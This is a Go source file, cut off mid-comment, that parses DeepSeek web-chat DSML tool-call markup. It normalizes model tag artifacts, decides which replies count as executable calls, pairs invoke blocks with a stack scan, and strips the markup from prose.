// DSML tool-call support for WebChat (chat.deepseek.com) conversations.
//
// DeepSeek's web model emits tool calls in a DSML-like XML markup instead
// of the OpenAI tool_calls JSON: the assistant's reply text contains
// <tool_calls> blocks with <invoke name="..."> and <parameter> children.
// WebChat cannot execute tools locally, so lp.HandleWebChat parses these
// blocks, executes the underlying dscli tools, and feeds the results back
// into the same conversation (see handleWebChatToolLoop in internal/lp).
//
// Which tools may be executed is decided by the role's tools config
// (`dscli role update --tools`), the SAME source that gates dscli chat's
// GetAllTools - there is no separate DSML allow-set. Role-configured tools
// are registered with their NATIVE names and parameter schemas (see
// dsml_doc.go), so a call maps 1:1 to the local tool: what the model writes
// is what the executor accepts, no translation. The only DSML-layer check
// that remains is the destructive-command interception for shell calls
// (dsmlBlockedCmdRe) in normalizeDSMLInvoke.
package dsml

import (
	"context"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"unicode"

	dsctx "github.com/dscli/dscli/internal/context"
	"github.com/dscli/dscli/internal/outfmt"
	"github.com/dscli/dscli/internal/prompt"
	"github.com/dscli/dscli/internal/toolcall"
	"github.com/nanjj/clog"
)

// DSMLCall is one parsed DSML tool call.
type DSMLCall struct {
	Name string
	Args map[string]any
}

// dsmlNameAttrRe extracts the name attribute value from an <invoke ...> open
// tag, tolerating double quotes, single quotes, or no quotes at all (the
// named-open gate dsmlNamedInvokeOpenRe is loose about the value's quoting).
// The \b boundary mirrors dsmlNamedInvokeOpenRe's whitespace-boundary rule:
// "name" inside another attribute's *value* (note="use name=x here") never
// matches because the open tag it runs on was already vetted by that regex.
var dsmlNameAttrRe = regexp.MustCompile(`\bname\s*=\s*("([^"]*)"|'([^']*)'|([^\s"'=<>]+))`)

// dsmlParamNameRe / dsmlParamStringRe extract the name and the optional
// string attribute from one parameter open tag. Both require double
// quotes on purpose: the web model emits them, and single-quoted or
// unquoted names are kept as content (the pre-strict parser dropped
// them the same way), so the strictness does not regress. DeepSeek
// sometimes omits the string attribute entirely; decodeDSMLValue's
// coercion path then keeps text text and numbers numeric, so the call
// is never silently dropped.
var (
	dsmlParamNameRe   = regexp.MustCompile(`\bname\s*=\s*"([^"]+)"`)
	dsmlParamStringRe = regexp.MustCompile(`\bstring\s*=\s*"(true|false)"`)
)

// dsmlEntityReplacer decodes the XML entities DeepSeek may emit inside
// parameter values. &amp; must be last so other entities are not re-escaped.
var dsmlEntityReplacer = strings.NewReplacer(
	"&lt;", "<",
	"&gt;", ">",
	"&quot;", `"`,
	"&apos;", "'",
	"&#39;", "'",
	"&amp;", "&",
)

// HasDSMLToolCalls reports whether text contains a tool-call block, complete
// OR truncated. The open-tag check is deliberate: a cut-off emission (opening
// tag without </invoke>) must still route into the loop, where ParseDSML
// reports the truncation and the residue is stripped instead of leaking to
// the caller. Only a NAMED opening tag closed with ">" counts: a bare
// "<invoke>" in prose carries no tool name (nothing to execute) and prose
// mentioning "<invoke name=" without ">" (including a mid-tag cutoff such as
// "<invoke name=\"shell" - no closing ">") never triggers routing.
// The latter is a documented limitation: a cut-off tag without ">" is
// indistinguishable from prose and is passed through untouched.
func HasDSMLToolCalls(text string) bool {
	return dsmlNamedInvokeOpenRe.MatchString(normalizeDSMLText(text))
}

// IsPureDSMLToolCalls reports whether text consists of NOTHING but DSML tool
// calls (plus optional <tool_calls>/<tool_result> wrappers): at least one
// complete call parses, and no prose remains after stripping block markup
// and wrappers. DeepSeek web emits tool-call replies as pure DSML, so the
// handleWebChat tool loop only executes when the reply IS a tool call; a
// long answer that merely QUOTES an <invoke> example (e.g. a review citing
// the test corpus) must never be executed nor fed "unsupported tool"
// feedback. Fenced-code and inline-code quotes fail the strip check on
// their own, without parser gymnastics.
func IsPureDSMLToolCalls(text string) bool {
	calls, err := ParseDSMLToolCalls(text)
	if err != nil || len(calls) == 0 {
		return false // truncated or no call at all: not an executable reply
	}
	return StripDSMLToolCalls(text) == ""
}

// dsmlToolCallsCloseEndRe matches a </tool_calls> close tag at the very end
// of the text (the match is anchored and tolerates trailing whitespace).
// Tolerating whitespace inside the tag mirrors dsmlInvokeCloseRe (models
// emit "</ tool_calls >" tokenization artifacts). The OPENING wrapper is
// deliberately not required (see IsDSMLToolCallEnd).
//
// `</_calls>` is accepted as a practical degradation: a real QA-engineer
// round closed with "</_calls>" (the model dropped "tool" from the tag)
// while every <invoke> inside parsed cleanly. The close tag is the
// "emission complete" intent signal, and a typo'd close does not change
// that intent - a wrapper whose calls all parse still executes, and a
// wrapper with no parseable <invoke> still yields zero calls (the loop
// exits without executing anything), so the safety boundary is unchanged.
//
// An EMPTY-NAME close (</> - the model dropped the whole tag name after
// a bare invoke, 2026-08-30 webchat shape) is accepted as the same degradation: the
// intent is a wrapper close attempt, and execution is still gated by parse success.
// `<_calls>` (and `<tool_calls>` with the slash missing) is accepted as
// the same degradation one step further: the model closed the round with
// the OPENING-tag spelling ("<_calls>" instead of "</_calls>"), observed in
// a real QA follow-up round on chat.deepseek.com. The FULL-NAME opening
// spelling `<\s*tool_calls\s*>` is admitted the same way: a 2026-08
// dsml.org capture ("重复的开头") shows the model repeating the wrapper
// header twice and closing the round with the slash-less "<tool_calls>"
// (inside DSML badge markers). The intent signal is the same - a wrapper
// close attempt at the very end after complete <invoke> blocks - and
// execution is still gated by parse success, so a dangling opening tag
// with no parseable calls executes nothing.
var dsmlToolCallsCloseEndRe = regexp.MustCompile(`(?s)(?:</\s*(?:tool_calls|_calls)?\s*>|<\s*(?:tool_calls|_calls)\s*>)\s*$`)

// dsmlToolCallsCloseCutRe matches a CUT-OFF wrapper close tag at the very
// end of the text: the opening "</" exists but the tag was truncated
// before its ">" (e.g. "</", "</tool_calls", "</_calls") — observed in a
// real QA round where every <invoke> parsed cleanly but the IDB-stored
// content ended mid-close-tag. The close tag is the "emission complete"
// intent signal, and a cut tag does not change that intent: the calls
// still parse, so the gate opens; execution safety is unchanged (parse
// success + role tool set + destructive-command interception).
var dsmlToolCallsCloseCutRe = regexp.MustCompile(`(?s)</\s*(?:tool_calls|_calls)?\s*$`)

// IsDSMLToolCallEnd reports whether text is INTENDED as a tool-call
// emission: it ENDS with a </tool_calls> close tag (after normalization and
// whitespace trim). This is the web expert's own signal - when the closing
// tag is present the emission is complete, whatever prose precedes it.
//
// Deliberately structural and intentional about its looseness:
//   - The OPENING <tool_calls> tag is NOT required. Models that self-correct
//     a missed close tag often emit just the trailing wrapper ("...我补上
//     </tool_calls>"): a lone close still qualifies, and the parser keeps
//     it harmless - a wrapper with no parseable <invoke> yields zero calls
//     and the loop exits without executing anything.
//   - It REPLACES the "only tool calls / short preamble" judgement
//     (IsPureDSMLToolCalls / the old IsDSMLToolCallReply): a reply that ends
//     with </tool_calls> is parsed and executed even when it carries a long
//     preamble ("你说得对，我重新发一遍正确的：" or an explanation of what
//     it is about to run), and the preamble is discarded with the round -
//     the parsed calls inside the wrapper are the instruction, the
//     surrounding text is the model's commentary.
//   - A reply that merely CITES an <invoke> example inside prose never ends
//     with the wrapper close tag, so it stays non-executable; a truncated
//     emission (opening tag without close) fails ParseDSMLToolCalls
//     downstream and is never executed. The role's tool allow-set plus
//     destructive-command interception (dsmlBlockedCmdRe) are the hard
//     safety boundary for whatever does execute.
func IsDSMLToolCallEnd(text string) bool {
	return dsmlToolCallsCloseEndRe.MatchString(strings.TrimSpace(normalizeDSMLText(text)))
}

// IsDSMLToolCallCut reports whether text is INTENDED as a tool-call emission
// whose wrapper close tag was CUT OFF at the very end (no closing ">").
// This is the truncated twin of IsDSMLToolCallEnd: the same intent signal
// (the expert began closing the wrapper) with the last byte truncated —
// "…</invoke>\n</" is common when the site's stored content is cut at a
// boundary, and "</tool_calls" / "</_calls" (name present, ">" missing) are
// the same cut. NOTE: a trailing bare "</" also matches — it is the
// motivating live shape (a real review round ended exactly there), and the
// regex accepts it by design. The gate alone does NOT execute:
// ParseDSMLToolCalls must still succeed (every <invoke> complete) for
// anything to run, so a cut wrapper around a truncated call stays
// non-executable, and quoted examples without a cut close stay
// non-executable too.
func IsDSMLToolCallCut(text string) bool {
	return dsmlToolCallsCloseCutRe.MatchString(strings.TrimSpace(normalizeDSMLText(text)))
}

// IsDSMLToolCallReply reports whether text is INTENDED as a tool-call
// emission and should route into the tool loop. It is the union of the
// three shapes the web model actually emits:
//
//   - IsDSMLToolCallEnd - the reply ends with a wrapper close tag (even the
//     typo'd </_calls> / <_calls> variants): the model's "emission
//     complete" signal, whatever prose precedes it, and the shape that
//     authorizes the implicit close of a missing </invoke> in
//     dsmlBlockRanges.
//   - IsDSMLToolCallCut - the wrapper close tag was cut off at the very end
//     ("…</" or "</tool_calls" without ">"): the emission is complete in
//     intent but the stored content was truncated at a boundary.
//   - IsPureDSMLToolCalls - the reply is a sequence of complete <invoke>
//     blocks (possibly inside a <tool_calls>/<tool_result> wrapper) with no
//     prose surviving after stripping block markup; observed 2026-08-29 for
//     a code_dev round: the model emitted "<invoke name=\"read_file\">
//     <parameter ...>…</invoke>" alone, with no <tool_calls> wrapper at all.
//
// Non-executable shapes stay outside the union by construction: a reply
// that CITES an <invoke> example (in prose, a fenced block, or an inline
// code span) leaves non-empty stripped text, so IsPureDSMLToolCalls says
// false; a truncated emission (an open without close, or a parameter never
// closed) fails ParseDSMLToolCalls, so every branch stays false.
func IsDSMLToolCallReply(text string) bool {
	return IsDSMLToolCallEnd(text) || IsDSMLToolCallCut(text) || IsPureDSMLToolCalls(text)
}

// dsmlNamedInvokeOpenRe matches an opening <invoke> tag that carries a name
// attribute - the only shape that can be a real tool call. It is also the
// gate for HasDSMLToolCalls and the "no opens" early exit in ParseDSMLToolCalls:
// a bare "<invoke>" in prose carries no tool name (nothing to execute) and
// must not count as a truncated call either. <\s*invoke tolerates whitespace
// after the opener: models sometimes emit "< invoke name=..." as a
// tokenization artifact.
//
// The attribute region is consumed as quoted strings ('...' or "...") or
// single chars, so name must be its own attribute at a whitespace boundary:
// "name" inside another attribute ("<invoke filename=...>",
// "<invoke data-name=...>") or INSIDE a quoted attribute value
// ("<invoke note=\"use name=x here\">") must NOT match.
var dsmlNamedInvokeOpenRe = regexp.MustCompile(`(?s)<\s*invoke\b(?:'[^']*'|"[^"]*"|[^'">])*\s+name\s*=[^>]*>`)

// dsmlInvokeCloseRe matches a closing </invoke> tag, tolerating the same
// whitespace variants as dsmlInvokeRe (models emit "</ invoke >").
var dsmlInvokeCloseRe = regexp.MustCompile(`(?s)</\s*invoke\s*>`)

// normalizeDSMLText repairs markup artifacts LLMs commonly emit around DSML
// tags before parsing, so a well-formed call is never misread as truncated
// ("DSML tool call truncated: N unclosed <invoke>"):
//
//   - full-width angle brackets ＜＞ -> half-width (Chinese models often
//     emit them instead of < >)
//   - Unicode format characters (zero-width space/joiner, BOM, soft hyphen,
//     direction marks) are dropped - they are invisible but break exact
//     tag matching. This is INTENTIONAL data loss: the same characters
//     also poison parameter values (shell commands), and pasted content
//     carrying them is a model artifact, not user intent.
//   - junk between a tag opener and its name is removed, but ONLY when a
//     known DSML tag name follows, e.g. "</｜｜\r\nDSML｜｜invoke>" ->
//     "</invoke>". Content such as "<dsml_config" stays untouched.
var dsmlFullwidthReplacer = strings.NewReplacer("＜", "<", "＞", ">")

// dsmlTagJunkRe strips separator noise directly after < or </, before the
// tag name: ASCII/full-width double-pipe markers (||, ｜) and "DSML"
// literals, with whitespace only between noise tokens. (?i) plus
// d\s*s\s*m\s*l covers spelling variants a model may emit ("D S M L").
//
// The noise is stripped ONLY when immediately followed by a known DSML tag
// name (invoke/parameter/tool_calls/_calls), which the capture group
// captures and re-emits ($1$2): a global "dsml" sweep would corrupt real
// content such as "cat <dsml_config" or prose "a <d s m l b". Go's RE2 has
// no lookahead, so the "followed by a tag" condition is expressed by
// capturing the tag name instead. Bare whitespace is deliberately NOT
// noise: "a < b" in prose or in a parameter value must survive
// normalization untouched.
//
// _calls is the typo'd twin of tool_calls (a real QA round closed with
// "</_calls>"). It is listed here because the site's stored copy of that
// close comes back with the DSML badge markers inside the tag: the wrapper
// is persisted as "</" + full-width pipe markers + the literal "DSML" +
// "_calls>" (observed shape: "</｜｜｜｜_calls>" — two full-width pipes, the
// DSML badge markers, two more pipes, then the tag name; the site renders
// the wrapper as a special UI object and stores the rendered form).
// Normalizing it back to "</_calls>" is what lets IsDSMLToolCallEnd and
// ParseDSMLToolCalls see the close at all.
var dsmlTagJunkRe = regexp.MustCompile(`(?i)(</?)(?:[|｜]\s*|d\s*s\s*m\s*l\s*)+((?:invoke|parameter|tool_calls|_calls)\b)`)

// dsmlTagJunkEmptyRe catches the empty-name badge form: a badge marker
// sequence (pipes or DSML literals) directly followed by > with no tag
// name at all, e.g. a bare invoke closed as </> (the model
// dropped the whole name). It normalizes to </> so the wrapper
// gates see the close. The capturing group keeps the > in place.
var dsmlTagJunkEmptyRe = regexp.MustCompile(`(?i)(</?)(?:[|｜]\s*|d\s*s\s*m\s*l\s*)+([>])`)

func normalizeDSMLText(text string) string {
	text = dsmlFullwidthReplacer.Replace(text)
	text = strings.Map(func(r rune) rune {
		if unicode.Is(unicode.Cf, r) {
			return -1
		}
		return r
	}, text)
	// $1 keeps the opener (</?), $2 re-emits the captured tag name so the
	// junk match can never eat into content that is not a DSML tag.
	text = dsmlTagJunkEmptyRe.ReplaceAllString(text, "$1$2")
	return dsmlTagJunkRe.ReplaceAllString(text, "$1$2")
}

// ParseDSMLToolCalls extracts all DSML tool calls from text. It returns an
// error when an invoke block is left unclosed (e.g. the response was cut
// off mid-emission): a truncated call must never be executed.
//
// Block pairing comes from dsmlBlockRangesStrict, whose stack scan treats
// parameter bodies as opaque: a literal invoke open/close inside a parameter
// VALUE is content, not structure.
func ParseDSMLToolCalls(text string) ([]DSMLCall, error) {
	calls, _, err := parseDSMLToolCallsStrict(text)
	return calls, err
}

// dsmlBlockRange is one completely paired <invoke name="...">...</invoke>
// span in the normalized text, as byte offsets.
type dsmlBlockRange struct {
	openStart  int // '<' of the open tag
	openEnd    int // '>' of the open tag, exclusive
	closeStart int // '<' of the matching close tag
	closeEnd   int // '>' of the matching close tag, exclusive
}

// dsmlStrayClose is one </invoke> close tag that appeared with an empty
// invoke stack: an extra close the model emitted after (or between) complete
// calls - a token artifact, not structure. It never pairs with anything, so
// ParseDSMLToolCalls ignores it. StripDSMLToolCalls removes it so the pure
// judgement (IsPureDSMLToolCalls) does not fail on a leftover artifact. A
// literal </invoke> inside a parameter VALUE (paramDepth > 0) or inside
// quoted code is content and is never a stray.
type dsmlStrayClose struct {
	pos int // '<' of the stray close tag
	end int // exclusive end of the stray close tag
}

// dsmlBlockName returns the name attribute of an <invoke> open tag.
func dsmlBlockName(tag string) string {
	m := dsmlNameAttrRe.FindStringSubmatch(tag)
	if m == nil {
		return ""
	}
	switch {
	case m[2] != "":
		return m[2]
	case m[3] != "":
		return m[3]
	default:
		return m[4]
	}
}

// dsmlCodeRanges returns the byte ranges of QUOTED content in text: fenced
// blocks (``` or ~~~, per CommonMark), inline code spans (a matched pair
// of backtick RUNS), and <tool_result> blocks (the executor's own feedback
// wrapper). DSML inside any of them is quoted content - a model showing
// how to write a tool call, an expert quoting the test corpus, or a model
// echoing a tool result it received - never an instruction to execute.
// Without this, a reply that merely exhibits
// '<invoke name="shell">...' inside a code block would run the
// exhibited command; an incomplete quote (an <invoke> inside a code span
// with no closing tag) would be reported as a truncated call, chopping the
// surrounding prose away; and an echoed <tool_result> block - which may
// carry tool names in its JSON - would be re-parsed as fresh calls.
//
// Fences: a line of at least three backticks or tildes (after leading
// spaces) OPENS a block; the next line of at least the same run of the
// SAME character closes it (CommonMark). An unclosed fence extends to the
// end of the text, also CommonMark. Only ONE repeated marker counts per
// line: a mixed line like "`~~" is not a fence.
//
// Inline spans: on lines outside fences, backtick RUNS pair by length
// (CommonMark): a run opens a span and the next run of the SAME length
// closes it, so `a “ b  a` is one span whose inner ticks are content.
// Runs of a different length are content, not new spans; an unmatched run
// opens nothing - prose ABOUT backticks ("markdown uses ` for code") must
// not swallow the rest of the line.
func dsmlCodeRanges(text string) [][2]int {
	var ranges [][2]int
	off := 0
	fence := 0   // active fence run length
	fenceCh := 0 // active fence character ('`' or '~')
	start := 0
	for _, line := range strings.SplitAfter(text, "\n") {
		trimmed := strings.TrimLeft(line, " \t")
		indent := len(line) - len(trimmed)
		// A run is ONE character repeated (CommonMark: a fence is a single
		// repeated marker; counting ` and ~ together would misread a mixed
		// line like "`~~" as a 3-run fence).
		ch := byte(0)
		if len(trimmed) > 0 && (trimmed[0] == '`' || trimmed[0] == '~') {
			ch = trimmed[0]
		}
		run := 0
		for run < len(trimmed) && trimmed[run] == ch {
			run++
		}
		rest := trimmed[run:]
		if fence == 0 {
			// Opening fence: >=3 of the same marker at the start of a line,
			// followed by nothing or an info string (e.g. "go", "bash").
			if run >= 3 && ch != 0 && !strings.HasPrefix(rest, string(ch)) {
				fence = run
				fenceCh = int(ch)
				start = off
				off += len(line)
				continue
			}
		} else if run >= fence && int(ch) == fenceCh && strings.TrimRight(rest, " \t\r\n") == "" {
			ranges = append(ranges, [2]int{start, off + len(line)})
			fence = 0
			off += len(line)
			continue // the closing fence line itself is not inline code
		}
		if fence != 0 {
			off += len(line)
			continue
		}
		// Inline code spans: backtick RUNS pair by CommonMark length - a
		// run opens a span and the next run of the SAME length closes it,
		// so `a `` b  a` is one span and its inner ticks are content. Runs
		// of a different length are content, not spans; an unmatched run
		// opens nothing, so prose ABOUT backticks must not swallow the
		// rest of the line.
		openPos, openLen := -1, 0
		for i := 0; i < len(trimmed); {
			if trimmed[i] != '`' {
				i++
				continue
			}
			j := i
			for j < len(trimmed) && trimmed[j] == '`' {
				j++
			}
			if openPos < 0 {
				openPos, openLen = i, j-i
			} else if j-i == openLen {
				ranges = append(ranges, [2]int{off + indent + openPos, off + indent + j})
				openPos = -1
			}
			i = j
		}
		off += len(line)
	}
	if fence != 0 {
		ranges = append(ranges, [2]int{start, len(text)})
	}
	// <tool_result> blocks are opaque: the executor's own feedback wrapper.
	// When a model echoes one back (tool result recalled in prose), its
	// JSON may carry tool names - that is echoed content, not fresh calls.
	for _, m := range dsmlToolResultRe.FindAllStringIndex(text, -1) {
		ranges = append(ranges, [2]int{m[0], m[1]})
	}
	sort.Slice(ranges, func(i, j int) bool { return ranges[i][0] < ranges[j][0] })
	return ranges
}

// inCodeRanges reports whether pos falls inside quoted code (fence or
// inline span). ranges is sorted by offset; the walk stops once past pos.
func inCodeRanges(ranges [][2]int, pos int) bool {
	for _, r := range ranges {
		if r[0] > pos {
			return false
		}
		if pos < r[1] {
			return true
		}
	}
	return false
}

// dsmlBlockRanges pairs named <invoke> opening tags with </invoke> closes in
// text order and returns every complete block plus the number of opens left
// unmatched and the byte offset of the first unmatched open (-1 when none).
// Blocks are sorted by openStart so consumers can walk them without overlap
// (a fully-nested block is a subset of its enclosing one).
//
// It is a small state machine, not a bare regex replace, because DSML
// structure must survive model artifacts:
//
//   - A stack gives correct nesting semantics: opens push, closes pop the
//     most recent open; a close with an empty stack is prose noise and is
//     ignored (it neither matches nor cancels anything). Mismatched shapes
//     such as two opens followed by one close leave one unclosed open
//     instead of silently pairing the first open with the first close.
//   - Parameter bodies are opaque: inside a <parameter> value, a raw
//     "<invoke name=...>" (shell snippet or DSML example the model did not
//     entity-escape) is content — it never pushes. A literal "</invoke>"
//     in a value likewise never pops. This is what makes a value's text
//     invisible to the structural scan, and it is exactly what lets a
//     parameter value carry a full DSML example without cutting the block.
//   - Param depth is counted (an open increments, a close decrements) so
//     nested parameter-looking text inside a value cannot leak structure.
//     Known limitation: a literal "</parameter>" inside a value closes the
//     body early (indistinguishable from a real close without a full XML
//     tokenizer); entity-escaped forms (&lt;/parameter&gt;) are safe
//     because escaping resolution happens after the scan.
//   - Quoted code (fenced blocks and inline code spans) is opaque: DSML
//     inside it is quoted content, not an instruction. See dsmlCodeRanges
//     for the rules.
//   - A wrapper close tag at the very end (see dsmlToolCallsCloseEndRe)
//     authorizes an IMPLICIT close for opens whose </invoke> the model
//     dropped: the wrapper close is the model's own "emission complete"
//     signal, and complete parameters plus that signal mean the call is
//     finished, not truncated (details in the function body).
//
// dsmlStructuralTag reports whether the tag at pos is STRUCTURE rather than content:
// it starts a line (only whitespace before it) or immediately follows another tag
// (the closing > of the previous tag, no space between). A tag inside a parameter
// value - pasted code, a Go comment, a doc snippet the model did not entity-escape -
// is content; after normalization, position is the only reliable discriminator.
func dsmlStructuralTag(text string, pos int) bool {
	i := pos
	for i > 0 && (text[i-1] == ' ' || text[i-1] == '\t') {
		i--
	}
	if i == 0 || text[i-1] == '\n' || text[i-1] == '\r' {
		return true
	}
	return text[i-1] == '>'
}

func dsmlBlockRangesStrict(text string) (blocks []dsmlBlockRange, unclosed int, firstUnclosed int, strays []dsmlStrayClose, implicitClose bool) {
	type ev struct {
		pos  int
		kind byte // 'o' invoke open, 'c' invoke close, 'p' param open, 'q' param close
		end  int  // exclusive end of the matched tag
	}
	fences := dsmlCodeRanges(text)
	events := []ev{}
	// addOpen collects OPEN tags: quoted-code content and NON-structural
	// tags (dsmlStructuralTag) are skipped - a tag inside a parameter value
	// (a Go comment, a pasted snippet the model left literally) is content,
	// not structure to pair. addClose only skips quoted-code content: a
	// closing tag may legitimately sit right after the value text on the same
	// line (the normal shape) or after the previous tag, so position must not
	// gate it; whether a close is structural is decided by the pairing state
	// (paramDepth / stack) below.
	addOpen := func(m []int, kind byte) {
		// Quoted-code content is skipped for every kind. An OPEN parameter
		// additionally needs to be structural (line start or right after
		// another tag) and to carry a name attribute: a tag inside a
		// parameter value (a Go comment, a pasted snippet the model left
		// literally) is content, not structure. OPEN invoke tags get no
		// position gate on purpose: a call after prose on the same line is
		// still a call.
		if inCodeRanges(fences, m[0]) {
			return
		}
		if kind == 'p' && (!dsmlStructuralTag(text, m[0]) || !dsmlParamNameRe.MatchString(text[m[0]:m[1]])) {
			return
		}
		events = append(events, ev{m[0], kind, m[1]})
	}
	addClose := func(m []int, kind byte) {
		if inCodeRanges(fences, m[0]) {
			return
		}
		events = append(events, ev{m[0], kind, m[1]})
	}
	for _, m := range dsmlNamedInvokeOpenRe.FindAllStringIndex(text, -1) {
		addOpen(m, 'o')
	}
	for _, m := range dsmlInvokeCloseRe.FindAllStringIndex(text, -1) {
		addClose(m, 'c')
	}
	for _, m := range dsmlParamOpenRe.FindAllStringIndex(text, -1) {
		addOpen(m, 'p')
	}
	for _, m := range dsmlParamCloseRe.FindAllStringIndex(text, -1) {
		addClose(m, 'q')
	}
	sort.Slice(events, func(i, j int) bool {
		if events[i].pos != events[j].pos {
			return events[i].pos < events[j].pos
		}
		return events[i].kind < events[j].kind
	})
	// open tracks one <invoke> open whose </invoke> may be missing.
	type open struct{ start, end int }
	stack := []open{} // unmatched opens, in text order
	paramDepth := 0
	firstUnclosed = -1
	for _, e := range events {
		switch e.kind {
		case 'p':
			paramDepth++
		case 'q':
			if paramDepth > 0 {
				paramDepth--
			}
		case 'o':
			if paramDepth == 0 {
				stack = append(stack, open{e.pos, e.end})
			}
		case 'c':
			if paramDepth == 0 && len(stack) > 0 {
				o := stack[len(stack)-1]
				stack = stack[:len(stack)-1]
				blocks = append(blocks, dsmlBlockRange{o.start, o.end, e.pos, e.end})
			} else if paramDepth == 0 {
				// A close with an empty invoke stack is an extra
				// `</invoke>` the model emitted after (or between)
				// complete calls - a token artifact, not structure. It
				// never pairs with anything; StripDSMLToolCalls must
				// remove it so IsPureDSMLToolCalls does not fail on a
				// leftover fragment. Literal `</invoke>` inside a
				// parameter value (paramDepth > 0) is content, not a
				// stray, and never reaches here.
				strays = append(strays, dsmlStrayClose{pos: e.pos, end: e.end})
			}
		}
	}
	// Implicit close: a wrapper close tag at the very end (</tool_calls>,
	// or its typo'd cousins </_calls> / <_calls>, or an
	// empty-name </>, see dsmlToolCallsCloseEndRe) is the model's own
	// "emission complete" signal - the same intent IsDSMLToolCallEnd gates the
	// tool loop on. When the model dropped the trailing </invoke> (observed
	// 2026-08-29: a code_review round stored as "...</parameter>\n</_calls>" in
	// the chat.deepseek.com IndexedDB - the close tag of both the call and the
	// wrapper collapsed into one typo'd fragment; 2026-08-30 webchat also cut
	// the last </parameter> right after the value), the one remaining open is a
	// complete call missing only its close tag: closing it implicitly at the
	// wrapper close keeps a finished emission executable instead of misreading
	// it as truncated. Exactly ONE open is required: with back-to-back siblings
	// each preceding invoke is closed by its own </invoke> and pops, so at
	// most one open remains, and only that one is implicitly closed. Several
	// opens at once (mis-nested shapes, e.g. a second invoke opened before
	// the first was closed) are a genuine truncation and must never run.
	if m := dsmlToolCallsCloseEndRe.FindStringIndex(text); m != nil && len(stack) == 1 {
		o := stack[0]
		blocks = append(blocks, dsmlBlockRange{o.start, o.end, m[0], m[1]})
		implicitClose = true
		stack = stack[:0]
	}
	unclosed = len(stack)
	if unclosed > 0 {
		firstUnclosed = stack[0].start
	}
	sort.Slice(blocks, func(i, j int) bool { return blocks[i].openStart < blocks[j].openStart })
	return blocks, unclosed, firstUnclosed, strays, implicitClose
}

// dsmlBlockRanges keeps the legacy four-value signature used across the
// parser and the existing tests; ParseDSMLMessage uses dsmlBlockRangesStrict
// to also learn whether an implicit close took place (violation #4).
func dsmlBlockRanges(text string) (blocks []dsmlBlockRange, unclosed int, firstUnclosed int, strays []dsmlStrayClose) {
	blocks, unclosed, firstUnclosed, strays, _ = dsmlBlockRangesStrict(text)
	return blocks, unclosed, firstUnclosed, strays
}

// decodeDSMLValue converts a raw parameter value to a Go value. string=true
// keeps the text verbatim (entity-decoded); string=false tries boolean and
// numeric coercion first, so numeric parameters (e.g. timeout) become real
// numbers, not "10000" text, and falls back to text when neither parses.
func decodeDSMLValue(raw string, isString bool) any {
	if isString {
		return dsmlEntityReplacer.Replace(raw)
	}
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return ""
	}
	if b, err := strconv.ParseBool(trimmed); err == nil {
		return b
	}
	if f, err := strconv.ParseFloat(trimmed, 64); err == nil {
		return f
	}
	// Not numeric (e.g. a quoted string without string="true"): keep as text.
	return dsmlEntityReplacer.Replace(raw)
}

// dsmlParamOpenRe / dsmlParamCloseRe delimit a <parameter> body. The
// structural scan needs the outer boundary only (no name/string attribute
// requirement): everything between a parameter open and its close is
// opaque VALUE content, and any tag-looking text inside it (a raw
// "<invoke", a "</invoke>", a nested "<parameter>") must not be read as
// structure.
var (
	dsmlParamOpenRe  = regexp.MustCompile(`(?s)<\s*parameter\b[^>]*>`)
	dsmlParamCloseRe = regexp.MustCompile(`(?s)</\s*parameter\s*>`)
)

// dsmlToolResultRe matches one complete <tool_result> block - the executor's
// feedback wrapper (see formatDSMLToolResult). The body is opaque quoted
// content: its JSON may carry tool names and markdown, none of which is a
// fresh tool call. Non-greedy matching is fine: blocks do not nest.
var dsmlToolResultRe = regexp.MustCompile(`(?s)<\s*tool_result\b[^>]*>.*?</\s*tool_result\s*>`)

// StripDSMLToolCalls removes tool-call blocks from text, leaving the
// surrounding prose. Used to return a clean partial result when the expert
// stops at a tool call (round cap or parse error). A truncated invoke - an
// opening tag that was never closed - chops everything from that tag to the
// end of the text: the tail is unparseable residue of a cut-off emission.
// The chop point comes from dsmlBlockRanges, which already treats parameter
// VALUES as opaque, so a raw "<invoke" inside a value is never taken for a
// real truncated call.
func StripDSMLToolCalls(text string) string {
	text = normalizeDSMLText(text)
	blocks, _, first, strays := dsmlBlockRanges(text)
	end := len(text)
	if first >= 0 {
		end = first // cut-off emission: the tail is unparseable residue
	}
	// Delete spans = complete blocks + stray closes. Strays live
	// outside any block, are sorted by pos (the scan walked events in
	// text order), and never overlap. Merging them into one ordered
	// walk removes a mid-text stray (between calls) as well as a
	// trailing one, while a literal close inside a parameter value or
	// quoted code is content and never appears in the list. A stray that
	// straddles the chop point (starts before end, ends after it) moves
	// the chop point to its own start: everything from the stray onward
	// is residue. The straddle branch is defensive - with real tag shapes
	// a close event and an unclosed open cannot overlap, so it is
	// unreachable by construction, but keeping it makes the triage total.
	var spans []dsmlBlockRange
	for _, s := range strays {
		switch {
		case s.pos >= end:
			// Entirely after the chop point: residue tail, dropped with it.
		case s.end <= end:
			// closeStart stays zero: a stray is not a paired block, the
			// merge loop only reads openStart/closeEnd.
			spans = append(spans, dsmlBlockRange{openStart: s.pos, closeEnd: s.end})
		default:
			// Straddles the chop point: everything from s.pos is residue.
			end = s.pos
		}
	}
	blocks = append(blocks, spans...)
	sort.Slice(blocks, func(i, j int) bool { return blocks[i].openStart < blocks[j].openStart })
	var b strings.Builder
	last := 0
	for _, blk := range blocks {
		if blk.closeEnd > end {
			break // block spans the chop point; nothing left to keep
		}
		if blk.openStart < last {
			continue // nested inside an already-removed block
		}
		b.WriteString(text[last:blk.openStart])
		last = blk.closeEnd
	}
	b.WriteString(text[last:end])
	out := b.String()
	// Collapse leftover empty <tool_calls> / <tool_result> wrappers and
	// blank noise. <tool_result> is the executor's own feedback wrapper: a
	// model echoing one back must not leave its protocol markup in the
	// caller-visible text (and IsPureDSMLToolCalls counts cleaned text).
	out = strings.ReplaceAll(out, "<tool_calls>", "")
	out = strings.ReplaceAll(out, "</tool_calls>", "")
	// A typo'd close tag (</_calls>, see dsmlToolCallsCloseEndRe) is a
	// variant of the same wrapper: if the emission was executed as a tool
	// call the residue must not leak into the caller-visible text. The
	// slash-less "_calls" (a close spelled like the opening tag, also
	// accepted by dsmlToolCallsCloseEndRe) is cleaned the same way.
	out = strings.ReplaceAll(out, "</_calls>", "")
	out = strings.ReplaceAll(out, "<_calls>", "")
	// A CUT-OFF close tag (see dsmlToolCallsCloseCutRe: "</", "</tool_calls"
	// without ">") leaves the wrapper fragment at the TAIL: strip it too, so
